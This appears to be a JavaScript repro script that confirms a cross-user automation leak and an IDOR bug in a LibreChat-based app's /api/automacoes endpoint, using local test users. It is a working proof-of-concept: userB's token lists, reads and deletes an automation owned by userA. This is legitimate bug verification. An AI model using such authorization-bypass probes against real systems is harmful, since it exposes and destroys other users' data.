/* Authoritative repro: cross-user automation leak + IDOR (bug #2).
 * Inserts an automation owned by userA (no tenantId, as in the iazzas
 * single-instance reality), then exercises /api/automacoes as userB. */
const { MongoClient, ObjectId } = require('mongodb');

const BASE = 'http://localhost:3080';
const MONGO = 'mongodb://127.0.0.1:50393/LibreChat';

async function login(email) {
  const r = await fetch(`${BASE}/api/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password: 'Test1234!' }),
  });
  const j = await r.json();
  return j.token;
}

(async () => {
  const emailA = 'leaka1779167407639@test.local';
  const emailB = 'leakb1779167407639@test.local';
  const tokenA = await login(emailA);
  const tokenB = await login(emailB);

  const c = new MongoClient(MONGO);
  await c.connect();
  const db = c.db('LibreChat');
  const userA = await db.collection('users').findOne({ email: emailA });
  const userB = await db.collection('users').findOne({ email: emailB });
  console.log('userA tenantId:', userA.tenantId, '| userB tenantId:', userB.tenantId);

  const autoId = new ObjectId();
  await db.collection('automations').insertOne({
    _id: autoId,
    flowId: new ObjectId(),
    name: `SEGREDO de ${emailA}`,
    cron: '0 9 * * *',
    timezone: 'America/Sao_Paulo',
    enabled: true,
    outputTargets: ['conversation', 'notification'],
    createdBy: String(userA._id),
    createdAt: new Date(),
    updatedAt: new Date(),
    // NOTE: no tenantId — matches real iazzas users (no SSO tenant)
  });
  await c.close();

  const auth = (t) => ({ Authorization: `Bearer ${t}` });

  const listA = await fetch(`${BASE}/api/automacoes`, { headers: auth(tokenA) });
  const bodyA = await listA.json();
  const listB = await fetch(`${BASE}/api/automacoes`, { headers: auth(tokenB) });
  const bodyB = await listB.json();

  const inList = (b) =>
    JSON.stringify(b).includes(`SEGREDO de ${emailA}`);

  console.log('--- LIST as userA (owner) ---', listA.status, 'sees own:', inList(bodyA));
  console.log('--- LIST as userB (other)  ---', listB.status, 'sees A’s:', inList(bodyB));

  const getB = await fetch(`${BASE}/api/automacoes/${autoId}`, { headers: auth(tokenB) });
  console.log('--- GET A’s automation as userB (IDOR read) ---', getB.status,
    JSON.stringify(await getB.json()).slice(0, 120));

  const delB = await fetch(`${BASE}/api/automacoes/${autoId}`, {
    method: 'DELETE', headers: auth(tokenB),
  });
  console.log('--- DELETE A’s automation as userB (IDOR delete) ---', delB.status);

  const verdict =
    inList(bodyB) ? 'LEAK CONFIRMED (userB sees userA automation)' : 'no leak';
  console.log('\nVERDICT:', verdict);
})().catch((e) => { console.error('REPRO ERR', e); process.exit(1); });
